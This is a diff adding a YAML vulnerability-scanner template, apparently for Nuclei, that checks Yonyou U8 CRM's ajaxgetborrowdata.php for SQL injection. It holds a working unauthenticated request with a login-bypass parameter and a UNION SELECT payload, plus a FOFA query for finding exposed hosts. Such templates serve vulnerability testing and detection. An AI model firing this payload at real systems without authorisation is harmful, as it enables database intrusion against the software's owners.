@@ -1,0 +1,36 @@
+id: poc-yaml-yongyon-u8-crm-ajaxgetborrowdata-php-sqli
+info:
+  name: 用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8+CRM
+    fofa: body="用友U8CRM"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=bgsesstimeout-;"
+    body: "cWhCode=1%27+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+KRVC"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+          - "0x{{t2}}"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
